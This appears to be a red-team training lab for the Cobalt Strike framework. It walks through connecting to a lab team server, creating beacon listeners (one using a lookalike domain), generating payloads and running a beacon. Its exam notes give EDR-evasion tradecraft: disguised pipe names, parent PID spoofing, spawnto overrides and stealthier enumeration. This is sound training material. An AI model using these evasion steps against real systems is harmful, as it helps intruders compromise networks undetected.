# Cobalt Strike Initial Commands  

The objective of this lab is to familiarse yourself with Cobalt Strike.  You will create listeners, generate payloads, and interact with Beacon.

* [Beacon commands](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=696a1d7abd92eef9e30f7537Unit)

===

# Launch Cobalt Strike

1. On the Windows taskbar, click on the Cobalt Strike icon.
1. Fill in the connection details for the team server.
  1. Host: `10.0.0.5`
  1. Port: `50050`
  1. Password: `Passw0rd!`

===

# Create Listeners

1. Go to **Cobalt Strike > Listeners** to bring  up the Listeners tab.
1. Click **Add** to create a new listener.

Add the following listeners:

## HTTP

1. Name: `http`
1. Payload: Beacon HTTP
1. HTTP Hosts: `www.bleepincomputer.com`
1. HTTP Host (Stager) : `www.bleepincomputer.com`

## SMB

1. Name: `smb`
1. Payload: Beacon SMB
1. Pipename: `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`

## TCP

1. Name: `tcp`
1. Payload: Beacon TCP
1. Port: `4444`
1. Bind to localhost: False

## TCP (local)

1. Name: `tcp-local`
1. Payload: Beacon TCP
1. Port: `1337`
1. Bind to localhost: True

===

# Generate Payloads

1. Generate payloads for each listener.
  1. Go to **Payloads > Windows Stageless Generate All Payloads**
  1. Folder: `C:\Payloads`
  1. Click **Generate**

===

# Interact with Beacon

1. Run *C:\Payloads\http_x64.exe* and a new Beacon session should appear.
1. Familiarise yourself with the client UI and running commands in Beacon.

⚠️ Use the `help` command to list all of the available commands, and `help [alias]` to get help for a specific command.

⚠️ In this lab, you have begun to explore the basics of using Cobalt Strike.

---

## OPSEC Warnings & Exam-Day Notes

### SMB Listener Pipename — Change on Exam Day
`TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337` is the lab default — it is a well-known CS IoC
flagged by Defender and detection rules. **Never use this on exam day.**

Create the SMB listener with a custom pipename that blends with legitimate Windows pipes:
```
# Good examples:
wkssvc-<random>
srvsvc-<random>
ntsvcs-<guid>

# Bad — all flagged:
TSVCPIPE-*   msagent_*   postex_*   MSSE-*
```

---

### `pwd` 
Use `pwd` to print the current working directory.

```cs
beacon> pwd       // correct
beacon> getpwd    // invalid — does not exist
```

---

### First Beacon Checklist — Run Immediately After Callback

Before running any post-ex commands, set beacon context to reduce OPSEC exposure:

```cs
beacon> sleep 3 20                                      // reduce check-in noise
beacon> ps                                              // get process list
beacon> ppid <svchost.exe PID>                          // spoof parent — see note below
beacon> spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
beacon> getuid                                          // confirm user context
```

---

### `ppid` — No `explorer.exe` on WinRM Beacons

`explorer.exe` only runs in **interactive desktop sessions** (console or RDP login).
A beacon landed via `jump winrm64` runs inside `wsmprovhost.exe` — no interactive session,
no explorer.exe in the process list.

**Use `svchost.exe` as the ppid target instead:**

```cs
beacon> ps                          // find a svchost.exe PID running as SYSTEM or LOCAL SERVICE
beacon> ppid <svchost.exe PID>      // svchost spawning werfault = normal Windows behaviour
```

| Beacon landed via | `ppid` target |
|---|---|
| WinRM (`jump winrm64`) | `svchost.exe` |
| Interactive user session | `explorer.exe` |
| Service execution | `services.exe` or `svchost.exe` |

---

### `net computers` — OPSEC-🔴UNSAFE, and Fails from WinRM Token

`net computers` spawns `cmd.exe` as a child process — visible to Sysmon Event 1 and EDR.
It also fails with **Error 5 (Access Denied)** from a WinRM Type 3 network logon token
because the non-interactive token lacks sufficient privileges for domain enumeration over the network.

**Never use `net computers`. Use ldapsearch BOF instead (OPSEC-🟢SAFE):**

```cs
// Enumerate domain computers — OPSEC-🟢SAFE (BOF, no child process)
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.
